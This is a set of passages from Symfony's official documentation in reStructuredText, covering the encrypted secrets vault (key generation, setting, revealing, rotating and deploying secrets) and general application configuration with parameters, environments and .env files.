    This modification can be of interest if you are working in a virtual
    environment and cannot use NFS - for example, if you're running a Symfony
    application using Vagrant/VirtualBox in a guest operating system.
How to Keep Sensitive Information Secret
========================================

:ref:`Environment variables <config-env-vars>` are the best way to store configuration
that depends on where the application is run - for example, some API key that
might be set to one value while developing locally and another value on production.

When these values are *sensitive* and need to be kept private, you can safely
store them by using Symfony's secrets management system - sometimes called a
"vault".

.. note::

    The Secrets system requires the Sodium PHP extension.

.. _secrets-generate-keys:

Generate Cryptographic Keys
---------------------------

In order to encrypt and decrypt **secrets**, Symfony needs **cryptographic keys**.
A pair of keys can be generated by running:

.. code-block:: terminal

    $ php bin/console secrets:generate-keys

This will generate a pair of asymmetric **cryptographic keys**. Each
:ref:`environment <configuration-environments>` has its own set of keys. Assuming
you're coding locally in the ``dev`` environment, this will create:

``config/secrets/dev/dev.encrypt.public.php``
    Used to encrypt/add secrets to the vault. Can be safely committed.

``config/secrets/dev/dev.decrypt.private.php``
    Used to decrypt/read secrets from the vault. The ``dev`` decryption key can
    be committed (assuming no highly-sensitive secrets are stored in the dev vault)
    but the ``prod`` decryption key should *never* be committed.

You can generate a pair of cryptographic keys for the ``prod`` environment by
running:

.. code-block:: terminal

    $ APP_RUNTIME_ENV=prod php bin/console secrets:generate-keys

This will generate ``config/secrets/prod/prod.encrypt.public.php`` and
``config/secrets/prod/prod.decrypt.private.php``.

.. danger::

    The ``prod.decrypt.private.php`` file is highly sensitive. Your team of developers
    and even Continuous Integration services don't need that key. If the
    **decryption key** has been exposed (ex-employee leaving for instance), you
    should consider generating a new one by running:
    ``secrets:generate-keys --rotate``.

.. _secrets-set:

Create or Update Secrets
------------------------

Suppose you want to store your database password as a secret. By using the
``secrets:set`` command, you should add this secret to both the ``dev`` *and*
``prod`` vaults:

.. code-block:: terminal

    # the input is hidden as you type for security reasons

    # set your default development value (can be overridden locally)
    $ php bin/console secrets:set DATABASE_PASSWORD

    # set your production value
    $ APP_RUNTIME_ENV=prod php bin/console secrets:set DATABASE_PASSWORD

This will create a new file for the secret in ``config/secrets/dev`` and another
in ``config/secrets/prod``. You can also set the secret in a few other ways:

.. code-block:: terminal

    # provide a file where to read the secret from
    $ php bin/console secrets:set DATABASE_PASSWORD ~/Download/password.json

    # or contents passed to STDIN
    $ echo -n "$DB_PASS" | php bin/console secrets:set DATABASE_PASSWORD -

    # or let Symfony generate a random value for you
    $ php bin/console secrets:set REMEMBER_ME --random

.. note::

    There's no command to rename secrets, so you'll need to create a new secret
    and remove the old one.

Referencing Secrets in Configuration Files
------------------------------------------

Secret values can be referenced in the same way as
:ref:`environment variables <config-env-vars>`. Be careful that you don't
accidentally define a secret *and* an environment variable with the same name:
**environment variables override secrets**.

If you stored a ``DATABASE_PASSWORD`` secret, you can reference it by:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/doctrine.yaml
        doctrine:
            dbal:
                password: '%env(DATABASE_PASSWORD)%'
                # ...
            # ...

    .. code-block:: xml

        <!-- config/packages/doctrine.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/doctrine
                https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

            <doctrine:config>
                <doctrine:dbal
                    password="%env(DATABASE_PASSWORD)%"
                />
            </doctrine:config>

        </container>

    .. code-block:: php

        // config/packages/doctrine.php
        use Symfony\Config\DoctrineConfig;

        return static function (DoctrineConfig $doctrine): void {
            $doctrine->dbal()
                ->connection('default')
                    ->password(env('DATABASE_PASSWORD'))
            ;
        };

The actual value will be resolved at runtime: container compilation and cache
warmup don't need the **decryption key**.

List Existing Secrets
---------------------

Everybody is allowed to list the secrets names with the command
``secrets:list``. If you have the **decryption key** you can also reveal the
secrets' values by passing the ``--reveal`` option:

.. code-block:: terminal

    $ php bin/console secrets:list --reveal

     ------------------- ------------ -------------
      Name                Value        Local Value
     ------------------- ------------ -------------
      DATABASE_PASSWORD   "my secret"
     ------------------- ------------ -------------

Reveal Existing Secrets
-----------------------

If you have the **decryption key**, the ``secrets:reveal`` command allows
you to reveal a single secret's value.

.. code-block:: terminal

    $ php bin/console secrets:reveal DATABASE_PASSWORD

     my secret

.. versionadded:: 7.1

    The ``secrets:reveal`` command was introduced in Symfony 7.1.

Remove Secrets
--------------

Symfony provides a convenient command to remove a Secret:

.. code-block:: terminal

    $ php bin/console secrets:remove DATABASE_PASSWORD

Local secrets: Overriding Secrets Locally
-----------------------------------------

The ``dev`` environment secrets should contain nice default values for development.
But sometimes a developer *still* needs to override a secret value locally when
developing.

Most of the ``secrets`` commands - including ``secrets:set`` - have a ``--local``
option that stores the "secret" in the ``.env.{env}.local`` file as a standard
environment variable. To override the ``DATABASE_PASSWORD`` secret locally, run:

.. code-block:: terminal

    $ php bin/console secrets:set DATABASE_PASSWORD --local

If you entered ``root``, you will now see this in your ``.env.dev.local`` file:

.. code-block:: bash

    DATABASE_PASSWORD=root

This will *override* the ``DATABASE_PASSWORD`` secret because environment variables
always take precedence over secrets.

Listing the secrets will now also display the local variable:

.. code-block:: terminal

    $ php bin/console secrets:list --reveal
     ------------------- ------------- -------------
      Name                Value         Local Value
     ------------------- ------------- -------------
      DATABASE_PASSWORD   "dev value"   "root"
     ------------------- ------------- -------------

Symfony also provides the ``secrets:decrypt-to-local`` command which decrypts
all secrets and stores them in the local vault and the ``secrets:encrypt-from-local``
command to encrypt all local secrets to the vault.

Secrets in the test Environment
-------------------------------

If you add a secret in the ``dev`` and ``prod`` environments, it will be missing
from the ``test`` environment. You *could* create a "vault" for the ``test``
environment and define the secrets there. But an easier way is to set the test
values via the ``.env.test`` file:

.. code-block:: bash

    # .env.test
    DATABASE_PASSWORD="testing"

Deploy Secrets to Production
----------------------------

Due to the fact that decryption keys should never be committed, you will need to
manually store this file somewhere and deploy it. There are 2 ways to do that:

#. Uploading the file

   The first option is to copy the **production decryption key** -
   ``config/secrets/prod/prod.decrypt.private.php`` to your server.

#. Using an Environment Variable

   The second way is to set the ``SYMFONY_DECRYPTION_SECRET`` environment variable
   to the base64 encoded value of the **production decryption key**. A fancy way to
   fetch the value of the key is:

   .. code-block:: terminal

       # this command only gets the value of the key; you must also set an env var
       # in your system with this value (e.g. `export SYMFONY_DECRYPTION_SECRET=...`)
       $ php -r 'echo base64_encode(require "config/secrets/prod/prod.decrypt.private.php");'

   To improve performance (i.e. avoid decrypting secrets at runtime), you can decrypt
   your secrets during deployment to the "local" vault:

   .. code-block:: terminal

       $ APP_RUNTIME_ENV=prod php bin/console secrets:decrypt-to-local --force

   This will write all the decrypted secrets into the ``.env.prod.local`` file.
   After doing this, the decryption key does *not* need to remain on the server(s).

Rotating Secrets
----------------

The ``secrets:generate-keys`` command provides a ``--rotate`` option to
regenerate the **cryptographic keys**. Symfony will decrypt existing secrets with
the old key, generate new **cryptographic keys** and re-encrypt secrets with the
new key. In order to decrypt previous secrets, the developer must have the
**decryption key**.

Configuration
-------------

The secrets system is enabled by default and some of its behavior can be configured:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            secrets:
                #vault_directory: '%kernel.project_dir%/config/secrets/%kernel.environment%'
                #local_dotenv_file: '%kernel.project_dir%/.env.%kernel.environment%.local'
                #decryption_env_var: 'base64:default::SYMFONY_DECRYPTION_SECRET'

    .. code-block:: xml

            <!-- config/packages/framework.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:framework="http://symfony.com/schema/dic/framework"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/framework https://symfony.com/schema/dic/framework/framework-1.0.xsd"
            >
                <framework:config secret="%env(APP_SECRET)%">
                    <framework:secrets
                        vault_directory="%kernel.project_dir%/config/secrets/%kernel.environment%"
                        local_dotenv_file="%kernel.project_dir%/.env.%kernel.environment%.local"
                        decryption_env_var="base64:default::SYMFONY_DECRYPTION_SECRET"
                    />
                </framework:config>
            </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->secrets()
                // ->vaultDirectory('%kernel.project_dir%/config/secrets/%kernel.environment%')
                // ->localDotenvFile('%kernel.project_dir%/.env.%kernel.environment%.local')
                // ->decryptionEnvVar('base64:default::SYMFONY_DECRYPTION_SECRET')
            ;
        };
Configuring Symfony
===================

Configuration Files
-------------------

Symfony applications are configured with the files stored in the ``config/``
directory, which has this default structure:

.. code-block:: text

    your-project/
    ├─ config/
    │  ├─ packages/
    │  ├─ bundles.php
    │  ├─ routes.yaml
    │  └─ services.yaml

* The ``routes.yaml`` file defines the :doc:`routing configuration </routing>`;
* The ``services.yaml`` file configures the services of the :doc:`service container </service_container>`;
* The ``bundles.php`` file enables/disables packages in your application;
* The ``config/packages/`` directory stores the configuration of every package
  installed in your application.

Packages (also called "bundles" in Symfony and "plugins/modules" in other
projects) add ready-to-use features to your projects.

When using :ref:`Symfony Flex <symfony-flex>`, which is enabled by default in
Symfony applications, packages update the ``bundles.php`` file and create new
files in ``config/packages/`` automatically during their installation. For
example, this is the default file created by the "API Platform" bundle:

.. code-block:: yaml

    # config/packages/api_platform.yaml
    api_platform:
        mapping:
            paths: ['%kernel.project_dir%/src/Entity']

Splitting the configuration into lots of small files might appear intimidating for some
Symfony newcomers. However, you'll get used to them quickly and you rarely need
to change these files after package installation.

.. tip::

    To learn about all the available configuration options, check out the
    :doc:`Symfony Configuration Reference </reference/index>` or run the
    ``config:dump-reference`` command.

.. _configuration-formats:

Configuration Formats
~~~~~~~~~~~~~~~~~~~~~

Unlike other frameworks, Symfony doesn't impose a specific format on you to
configure your applications, but lets you choose between YAML, XML and PHP.
Throughout the Symfony documentation, all configuration examples will be
shown in these three formats.

There isn't any practical difference between formats. In fact, Symfony
transforms all of them into PHP and caches them before running the application,
so there's not even any performance difference.

YAML is used by default when installing packages because it's concise and very
readable. These are the main advantages and disadvantages of each format:

* **YAML**: simple, clean and readable, but not all IDEs support autocompletion
  and validation for it. :doc:`Learn the YAML syntax </reference/formats/yaml>`;
* **XML**: autocompleted/validated by most IDEs and is parsed natively by PHP,
  but sometimes it generates configuration considered too verbose. `Learn the XML syntax`_;
* **PHP**: very powerful and it allows you to create dynamic configuration with
  arrays or a :ref:`ConfigBuilder <config-config-builder>`.

.. note::

    By default Symfony loads the configuration files defined in YAML and PHP
    formats. If you define configuration in XML format, update the
    :method:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait::configureContainer`
    and/or
    :method:`Symfony\\Bundle\\FrameworkBundle\\Kernel\\MicroKernelTrait::configureRoutes`
    methods in the ``src/Kernel.php`` file to add support for the ``.xml`` file
    extension.

Importing Configuration Files
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony loads configuration files using the :doc:`Config component
</components/config>`, which provides advanced features such as importing other
configuration files, even if they use a different format:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        imports:
            - { resource: 'legacy_config.php' }

            # glob expressions are also supported to load multiple files
            - { resource: '/etc/myapp/*.yaml' }

            # ignore_errors: not_found silently discards errors if the loaded file doesn't exist
            - { resource: 'my_config_file.xml', ignore_errors: not_found }
            # ignore_errors: true silently discards all errors (including invalid code and not found)
            - { resource: 'my_other_config_file.xml', ignore_errors: true }

        # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <imports>
                <import resource="legacy_config.php"/>
                <!-- glob expressions are also supported to load multiple files -->
                <import resource="/etc/myapp/*.yaml"/>

                <!-- ignore-errors="not_found" silently discards errors if the loaded file doesn't exist -->
                <import resource="my_config_file.yaml" ignore-errors="not_found"/>
                <!-- ignore-errors="true" silently discards all errors (including invalid code and not found) -->
                <import resource="my_other_config_file.yaml" ignore-errors="true"/>
            </imports>

            <!-- ... -->
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->import('legacy_config.php');

            // glob expressions are also supported to load multiple files
            $container->import('/etc/myapp/*.yaml');

            // the third optional argument of import() is 'ignore_errors'
            // 'ignore_errors' set to 'not_found' silently discards errors if the loaded file doesn't exist
            $container->import('my_config_file.yaml', null, 'not_found');
            // 'ignore_errors' set to true silently discards all errors (including invalid code and not found)
            $container->import('my_config_file.yaml', null, true);
        };

        // ...

.. _config-parameter-intro:
.. _config-parameters-yml:
.. _configuration-parameters:

Configuration Parameters
------------------------

Sometimes the same configuration value is used in several configuration files.
Instead of repeating it, you can define it as a "parameter", which is like a
reusable configuration value. By convention, parameters are defined under the
``parameters`` key in the ``config/services.yaml`` file:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            # the parameter name is an arbitrary string (the 'app.' prefix is recommended
            # to better differentiate your parameters from Symfony parameters).
            app.admin_email: 'something@example.com'

            # boolean parameters
            app.enable_v2_protocol: true

            # array/collection parameters
            app.supported_locales: ['en', 'es', 'fr']

            # binary content parameters (encode the contents with base64_encode())
            app.some_parameter: !!binary VGhpcyBpcyBhIEJlbGwgY2hhciAH

            # PHP constants as parameter values
            app.some_constant: !php/const GLOBAL_CONSTANT
            app.another_constant: !php/const App\Entity\BlogPost::MAX_ITEMS

            # Enum case as parameter values
            app.some_enum: !php/enum App\Enum\PostState::Published

        # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <parameters>
                <!-- the parameter name is an arbitrary string (the 'app.' prefix is recommended
                     to better differentiate your parameters from Symfony parameters). -->
                <parameter key="app.admin_email">something@example.com</parameter>

                <!-- boolean parameters -->
                <parameter key="app.enable_v2_protocol">true</parameter>
                <!-- if you prefer to store the boolean value as a string in the parameter -->
                <parameter key="app.enable_v2_protocol" type="string">true</parameter>

                <!-- array/collection parameters -->
                <parameter key="app.supported_locales" type="collection">
                    <parameter>en</parameter>
                    <parameter>es</parameter>
                    <parameter>fr</parameter>
                </parameter>

                <!-- binary content parameters (encode the contents with base64_encode()) -->
                <parameter key="app.some_parameter" type="binary">VGhpcyBpcyBhIEJlbGwgY2hhciAH</parameter>

                <!-- PHP constants as parameter values -->
                <parameter key="app.some_constant" type="constant">GLOBAL_CONSTANT</parameter>
                <parameter key="app.another_constant" type="constant">App\Entity\BlogPost::MAX_ITEMS</parameter>

                <!-- Enum case as parameter values -->
                <parameter key="app.some_enum" type="enum">App\Enum\PostState::Published</parameter>
            </parameters>

            <!-- ... -->
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Entity\BlogPost;
        use App\Enum\PostState;

        return static function (ContainerConfigurator $container): void {
            $container->parameters()
                // the parameter name is an arbitrary string (the 'app.' prefix is recommended
                // to better differentiate your parameters from Symfony parameters).
                ->set('app.admin_email', 'something@example.com')

                // boolean parameters
                ->set('app.enable_v2_protocol', true)

                // array/collection parameters
                ->set('app.supported_locales', ['en', 'es', 'fr'])

                // binary content parameters (use the PHP escape sequences)
                ->set('app.some_parameter', 'This is a Bell char: \x07')

                // PHP constants as parameter values
                ->set('app.some_constant', GLOBAL_CONSTANT)
                ->set('app.another_constant', BlogPost::MAX_ITEMS)

                // Enum case as parameter values
                ->set('app.some_enum', PostState::Published);
        };

        // ...

.. caution::

    By default and when using XML configuration, the values between ``<parameter>``
    tags are not trimmed. This means that the value of the following parameter will be
    ``'\n    something@example.com\n'``:

    .. code-block:: xml

        <parameter key="app.admin_email">
            something@example.com
        </parameter>

    If you want to trim the value of your parameter, use the ``trim`` attribute.
    When using it, the value of the following parameter will be ``something@example.com``:

    .. code-block:: xml

        <parameter key="app.admin_email" trim="true">
            something@example.com
        </parameter>

Once defined, you can reference this parameter value from any other
configuration file using a special syntax: wrap the parameter name in two ``%``
(e.g. ``%app.admin_email%``):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/some_package.yaml
        some_package:
            # any string surrounded by two % is replaced by that parameter value
            email_address: '%app.admin_email%'

    .. code-block:: xml

        <!-- config/packages/some_package.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- any string surrounded by two % is replaced by that parameter value -->
            <some-package:config email-address="%app.admin_email%">
                <!-- ... -->
            </some-package:config>
        </container>

    .. code-block:: php

        // config/packages/some_package.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;
        use function Symfony\Component\DependencyInjection\Loader\Configurator\param;

        return static function (ContainerConfigurator $container): void {
            $container->extension('some_package', [
                // when using the param() function, you only have to pass the parameter name...
                'email_address' => param('app.admin_email'),

                // ... but if you prefer it, you can also pass the name as a string
                // surrounded by two % (same as in YAML and XML formats) and Symfony will
                // replace it by that parameter value
                'email_address' => '%app.admin_email%',
            ]);
        };

.. note::

    If some parameter value includes the ``%`` character, you need to escape it
    by adding another ``%``, so Symfony doesn't consider it a reference to a
    parameter name:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            parameters:
                # Parsed as 'https://symfony.com/?foo=%s&amp;bar=%d'
                url_pattern: 'https://symfony.com/?foo=%%s&amp;bar=%%d'

        .. code-block:: xml

            <!-- config/services.xml -->
            <parameters>
                <parameter key="url_pattern">http://symfony.com/?foo=%%s&amp;bar=%%d</parameter>
            </parameters>

        .. code-block:: php

            // config/services.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            return static function (ContainerConfigurator $container): void {
                $container->parameters()
                    ->set('url_pattern', 'http://symfony.com/?foo=%%s&amp;bar=%%d');
            };

.. include:: /components/dependency_injection/_imports-parameters-note.rst.inc

Configuration parameters are very common in Symfony applications. Some packages
even define their own parameters (e.g. when installing the translation package,
a new ``locale`` parameter is added to the ``config/services.yaml`` file).

.. tip::

    By convention, parameters whose names start with a dot ``.`` (for example,
    ``.mailer.transport``), are available only during the container compilation.
    They are useful when working with :ref:`Compiler Passes </service_container/compiler_passes>`
    to declare some temporary parameters that won't be available later in the application.

.. seealso::

    Later in this article you can read how to
    :ref:`get configuration parameters in controllers and services <configuration-accessing-parameters>`.

.. _page-creation-environments:
.. _page-creation-prod-cache-clear:
.. _configuration-environments:

Configuration Environments
--------------------------

You have only one application, but whether you realize it or not, you need it
to behave differently at different times:

* While **developing**, you want to log everything and expose nice debugging tools;
* After deploying to **production**, you want that same application to be
  optimized for speed and only log errors.

The files stored in ``config/packages/`` are used by Symfony to configure the
:doc:`application services </service_container>`. In other words, you can change
the application behavior by changing which configuration files are loaded.
That's the idea of Symfony's **configuration environments**.

A typical Symfony application begins with three environments:

* ``dev`` for local development,
* ``prod`` for production servers,
* ``test`` for :doc:`automated tests </testing>`.

When running the application, Symfony loads the configuration files in this
order (the last files can override the values set in the previous ones):

#. The files in ``config/packages/*.<extension>``;
#. the files in ``config/packages/<environment-name>/*.<extension>``;
#. ``config/services.<extension>``;
#. ``config/services_<environment-name>.<extension>``.

Take the ``framework`` package, installed by default, as an example:

* First, ``config/packages/framework.yaml`` is loaded in all environments and
  it configures the framework with some options;
* In the **prod** environment, nothing extra will be set as there is no
  ``config/packages/prod/framework.yaml`` file;
* In the **dev** environment, there is no file either (
  ``config/packages/dev/framework.yaml`` does not exist).
* In the **test** environment, the ``config/packages/test/framework.yaml`` file
  is loaded to override some of the settings previously configured in
  ``config/packages/framework.yaml``.

In reality, each environment differs only somewhat from others. This means that
all environments share a large base of common configuration, which is put in
files directly in the ``config/packages/`` directory.

.. tip::

    You can also define options for different environments in a single
    configuration file using the special ``when`` keyword:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/webpack_encore.yaml
            webpack_encore:
                # ...
                output_path: '%kernel.project_dir%/public/build'
                strict_mode: true
                cache: false

            # cache is enabled only in the "prod" environment
            when@prod:
                webpack_encore:
                    cache: true

            # disable strict mode only in the "test" environment
            when@test:
                webpack_encore:
                    strict_mode: false

            # YAML syntax allows to reuse contents using "anchors" (&some_name) and "aliases" (*some_name).
            # In this example, 'test' configuration uses the exact same configuration as in 'prod'
            when@prod: &webpack_prod
                webpack_encore:
                    # ...
            when@test: *webpack_prod

        .. code-block:: xml

            <!-- config/packages/webpack_encore.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">
                <webpack-encore:config
                    output-path="%kernel.project_dir%/public/build"
                    strict-mode="true"
                    cache="false"
                />

                <!-- cache is enabled only in the "test" environment -->
                <when env="prod">
                    <webpack-encore:config cache="true"/>
                </when>

                <!-- disable strict mode only in the "test" environment -->
                <when env="test">
                    <webpack-encore:config strict-mode="false"/>
                </when>
            </container>

        .. code-block:: php

            // config/packages/framework.php
            use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
            use Symfony\Config\WebpackEncoreConfig;

            return static function (WebpackEncoreConfig $webpackEncore, ContainerConfigurator $container): void {
                $webpackEncore
                    ->outputPath('%kernel.project_dir%/public/build')
                    ->strictMode(true)
                    ->cache(false)
                ;

                // cache is enabled only in the "prod" environment
                if ('prod' === $container->env()) {
                    $webpackEncore->cache(true);
                }

                // disable strict mode only in the "test" environment
                if ('test' === $container->env()) {
                    $webpackEncore->strictMode(false);
                }
            };

.. seealso::

    See the ``configureContainer()`` method of
    :doc:`the Kernel class </configuration/front_controllers_and_kernel>` to
    learn everything about the loading order of configuration files.

.. _selecting-the-active-environment:

Selecting the Active Environment
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony applications come with a file called ``.env`` located at the project
root directory. This file is used to define the value of environment variables
and it's explained in detail :ref:`later in this article <config-dot-env>`.

Open the ``.env`` file (or better, the ``.env.local`` file if you created one)
and edit the value of the ``APP_ENV`` variable to change the environment in
which the application runs. For example, to run the application in production:

.. code-block:: bash

    # .env (or .env.local)
    APP_ENV=prod

This value is used both for the web and for the console commands. However, you
can override it for commands by setting the ``APP_ENV`` value before running them:

.. code-block:: terminal

    # Use the environment defined in the .env file
    $ php bin/console command_name

    # Ignore the .env file and run this command in production
    $ APP_ENV=prod php bin/console command_name

Creating a New Environment
~~~~~~~~~~~~~~~~~~~~~~~~~~

The default three environments provided by Symfony are enough for most projects,
but you can define your own environments too. For example, this is how you can
define a ``staging`` environment where the client can test the project before
going to production:

#. Create a configuration directory with the same name as the environment (in
   this case, ``config/packages/staging/``);
#. Add the needed configuration files in ``config/packages/staging/`` to
   define the behavior of the new environment. Symfony loads the
   ``config/packages/*.yaml`` files first, so you only need to configure the
   differences to those files;
#. Select the ``staging`` environment using the ``APP_ENV`` env var as explained
   in the previous section.

.. tip::

    It's common for environments to be similar to each other, so you can
    use `symbolic links`_ between ``config/packages/<environment-name>/``
    directories to reuse the same configuration.

Instead of creating new environments, you can use environment variables as
explained in the following section. This way you can use the same application
and environment (e.g. ``prod``) but change its behavior thanks to the
configuration based on environment variables (e.g. to run the application in
different scenarios: staging, quality assurance, client review, etc.)

.. _config-env-vars:

Configuration Based on Environment Variables
--------------------------------------------

Using `environment variables`_ (or "env vars" for short) is a common practice to:

* Configure options that depend on where the application is run (e.g. the database
  credentials are usually different in production versus your local machine);
* Configure options that can change dynamically in a production environment (e.g.
  to update the value of an expired API key without having to redeploy the entire
  application).

In other cases, it's recommended to keep using :ref:`configuration parameters <configuration-parameters>`.

Use the special syntax ``%env(ENV_VAR_NAME)%`` to reference environment variables.
The values of these options are resolved at runtime (only once per request, to
not impact performance) so you can change the application behavior without having
to clear the cache.

This example shows how you could configure the application secret using an env var:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            # by convention the env var names are always uppercase
            secret: '%env(APP_SECRET)%'
            # ...

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/framework"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- by convention the env var names are always uppercase -->
            <framework:config secret="%env(APP_SECRET)%"/>

        </container>

    .. code-block:: php

        // config/packages/framework.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->extension('framework', [
                // by convention the env var names are always uppercase
                'secret' => '%env(APP_SECRET)%',
            ]);
        };

.. note::

    Your env vars can also be accessed via the PHP super globals ``$_ENV`` and
    ``$_SERVER`` (both are equivalent)::

        $databaseUrl = $_ENV['DATABASE_URL']; // mysql://db_user:db_password@127.0.0.1:3306/db_name
        $env = $_SERVER['APP_ENV']; // prod

    However, in Symfony applications there's no need to use this, because the
    configuration system provides a better way of working with env vars.

.. seealso::

    The values of env vars can only be strings, but Symfony includes some
    :doc:`env var processors </configuration/env_var_processors>` to transform
    their contents (e.g. to turn a string value into an integer).

To define the value of an env var, you have several options:

* :ref:`Add the value to a .env file <config-dot-env>`;
* :ref:`Encrypt the value as a secret <configuration-secrets>`;
* Set the value as a real environment variable in your shell or your web server.

If your application tries to use an env var that hasn't been defined, you'll see
an exception. You can prevent that by defining a default value for the env var.
To do so, define a parameter with the same name as the env var using this syntax:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        parameters:
            # if the SECRET env var value is not defined anywhere, Symfony uses this value
            env(SECRET): 'some_secret'

        # ...

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <parameters>
                <!-- if the SECRET env var value is not defined anywhere, Symfony uses this value -->
                <parameter key="env(SECRET)">some_secret</parameter>
            </parameters>

            <!-- ... -->
        </container>

    .. code-block:: php

        // config/packages/framework.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Config\FrameworkConfig;

        return static function (ContainerBuilder $container, FrameworkConfig $framework) {
            // if the SECRET env var value is not defined anywhere, Symfony uses this value
            $container->setParameter('env(SECRET)', 'some_secret');

            // ...
        };

.. tip::

    Some hosts - like Platform.sh - offer easy `utilities to manage env vars`_
    in production.

.. note::

    Some configuration features are not compatible with env vars. For example,
    defining some container parameters conditionally based on the existence of
    another configuration option. When using an env var, the configuration option
    always exists, because its value will be ``null`` when the related env var
    is not defined.

.. danger::

    Beware that dumping the contents of the ``$_SERVER`` and ``$_ENV`` variables
    or outputting the ``phpinfo()`` contents will display the values of the
    environment variables, exposing sensitive information such as the database
    credentials.

    The values of the env vars are also exposed in the web interface of the
    :doc:`Symfony profiler </profiler>`. In practice this shouldn't be a
    problem because the web profiler must **never** be enabled in production.

.. _configuration-env-var-in-dev:
.. _config-dot-env:

Configuring Environment Variables in .env Files
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of defining env vars in your shell or your web server, Symfony provides
a convenient way to define them inside a ``.env`` (with a leading dot) file
located at the root of your project.

The ``.env`` file is read and parsed on every request and its env vars are added
to the ``$_ENV`` & ``$_SERVER`` PHP variables. Any existing env vars are *never*
overwritten by the values defined in ``.env``, so you can combine both.

For example, to define the ``DATABASE_URL`` env var shown earlier in this article,
you can add:

.. code-block:: bash

    # .env
    DATABASE_URL="mysql://db_user:db_password@127.0.0.1:3306/db_name"

This file should be committed to your repository and (due to that fact) should
only contain "default" values that are good for local development. This file
should not contain production values.

In addition to your own env vars, this ``.env`` file also contains the env vars
defined by the third-party packages installed in your application (they are
added automatically by :ref:`Symfony Flex <symfony-flex>` when installing packages).

.. tip::

    Since the ``.env`` file is read and parsed on every request, you don't need to
